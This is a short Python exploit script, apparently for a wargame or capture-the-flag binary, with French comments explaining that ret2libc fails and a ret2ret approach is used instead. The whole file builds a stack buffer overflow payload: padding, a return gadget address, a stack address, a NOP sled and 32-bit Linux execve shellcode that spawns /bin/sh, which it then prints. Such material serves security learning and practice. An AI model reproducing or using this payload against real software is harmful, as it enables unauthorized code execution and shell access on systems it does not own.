

# ret2libc fonctionne pas car commence par adresse system commence avec 0xb
# ret2ret

import struct 



nop_sled=b'\x90'*40
shellcode = b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80'

padding = b'A'*80

ret_addres = struct.pack('<I', 0x08048544)
ret_addres_two=struct.pack('<I', 0xbffff7d0)



payload = padding + ret_addres + ret_addres_two + nop_sled + shellcode

print(payload)